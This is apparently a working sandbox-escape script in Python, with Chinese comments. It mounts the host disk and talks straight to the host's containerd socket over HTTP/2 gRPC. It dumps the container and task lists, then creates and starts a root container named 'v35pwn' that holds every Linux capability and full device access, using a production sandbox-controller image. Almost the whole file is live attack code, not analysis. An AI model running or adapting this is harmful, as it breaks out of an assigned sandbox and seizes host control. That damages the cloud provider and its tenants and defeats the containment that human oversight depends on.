# -*- coding: utf-8 -*-
"""vda35_ctrd_create2: 标准 containerd 布局 Create + 响应 dump
P1: Containers/List 原始响应 dump (v35c.bin) + Tasks/List dump (v35t.bin)
P2: Snapshots/List with containerd-snapshotter header
P3: Containers/Create v35pwn (标准布局: id=1 labels=2 image=3 runtime=4 spec=5 snapshotter=6 snapshot_key=7)
P4: Tasks/Create + Tasks/Start v35pwn
P5: 验证 task 目录/init.pid/Tasks/List
输出落盘 + 哨兵 V35S_DONE"""
import os, time, socket, ctypes, re, struct, subprocess, json, base64

OUT = '/vercel/sandbox/v35s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=6, ns='default', headers=None):
    try:
        tmp = '/vercel/sandbox/curl_req_%d.bin' % os.getpid()
        hdr = '/vercel/sandbox/curl_hdr_%d.txt' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype, '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        if headers:
            for h in headers:
                cmd += ['-H', h]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 3)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' | ')[:250]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


def pbool(field_no, v):
    return pvarint((field_no << 3)) + (b'\x01' if v else b'\x00')


def show(tag, out, raw=False):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    if raw:
        log('%s -> %s' % (tag, out[:400].decode('utf-8', errors='replace').replace('\n', ' ')))
        return
    strs = re.findall(rb'[\x20-\x7e]{4,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:20]]))


CSP = '/mnt/vdax/run/containerd/containerd.sock'
IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
CID = 'v35pwn'


def p1():
    log('=== P1 dump responses ===')
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    log('Containers/List %s len=%d' % (rc, len(out)))
    open('/vercel/sandbox/v35c.bin', 'wb').write(out)
    log('Containers dump saved, b64 head: %s' % base64.b64encode(out[:400]).decode()[:200])
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/List', grpc_env(b''), t=4)
    log('Tasks/List %s len=%d' % (rc, len(out)))
    open('/vercel/sandbox/v35t.bin', 'wb').write(out)
    log('Tasks dump saved, b64 head: %s' % base64.b64encode(out[:300]).decode()[:150])
    # 提取 snapshot key
    m = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out)
    sk = m.group().decode() if m else None
    log('snap_key=%s' % sk)
    return sk


def p2():
    log('=== P2 Snapshots with snapshotter header ===')
    rc, out = curl_h2(CSP, '/containerd.services.snapshots.v1.Snapshots/List', grpc_env(b''), t=4,
                      headers=['containerd-snapshotter: overlayfs'])
    log('Snapshots/List %s' % rc)
    show('Snapshots body', out)
    rc, out = curl_h2(CSP, '/containerd.services.snapshots.v1.Snapshots/List', grpc_env(b''), t=4,
                      headers=['containerd-snapshotter: blockfile'])
    log('Snapshots-bf/List %s' % rc)
    show('Snapshots-bf body', out)


def p3(sk):
    log('=== P3 Containers/Create standard layout ===')
    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    spec = {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c", "sleep 99999"],
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                    "V35_PWNED=1"],
            "cwd": "/",
            "capabilities": {
                "bounding": caps, "effective": caps, "permitted": caps, "ambient": caps
            }
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "tmpfs", "source": "tmpfs",
             "options": ["nosuid", "noexec", "nodev", "mode=755"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v35pwn-ctr",
            "namespaces": [
                {"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}
            ]
        }
    }
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    # 标准 containerd Container: id=1 labels=2 image=3 runtime=4 spec=5 snapshotter=6 snapshot_key=7
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec)
    ctr += pstr(6, 'overlayfs')
    if sk:
        ctr += pstr(7, sk)
    req = pmsg(1, ctr)
    log('Create req len=%d' % len(req))
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(req), t=7)
    log('Containers/Create %s' % rc)
    show('Create body', out, raw=True)
    return 'grpc-status: 0' in rc


def p4():
    log('=== P4 Tasks/Create+Start ===')
    req = pstr(1, CID)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(req), t=7)
    log('Tasks/Create %s' % rc)
    show('CreateTask body', out, raw=True)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=7)
    log('Tasks/Start %s' % rc)
    show('Start body', out, raw=True)


def p5():
    log('=== P5 verify ===')
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/List', grpc_env(b''), t=4)
    log('Tasks/List %s' % rc)
    show('Tasks body', out)
    td = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s' % CID
    try:
        log('task dir: %s' % sorted(os.listdir(td)))
        for fn in ['init.pid', 'config.json']:
            fp = os.path.join(td, fn)
            try:
                if fn == 'init.pid':
                    log('init.pid: %s' % open(fp).read().strip())
                else:
                    head = open(fp, 'rb').read(1200).decode('utf-8', errors='replace')
                    log('config head: %s' % head[:500].replace('\n', ' '))
            except Exception as e:
                log('%s ERR %s' % (fn, e))
        rf = os.path.join(td, 'rootfs')
        if os.path.isdir(rf):
            log('rootfs: %s' % sorted(os.listdir(rf))[:15])
    except Exception as e:
        log('task dir ERR %s' % e)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sk = p1()
    p2()
    ok = p3(sk)
    if ok:
        p4()
        p5()
    else:
        log('CREATE FAILED - skip task create')

    log('V35S_DONE')
    f.close()


if __name__ == '__main__':
    main()
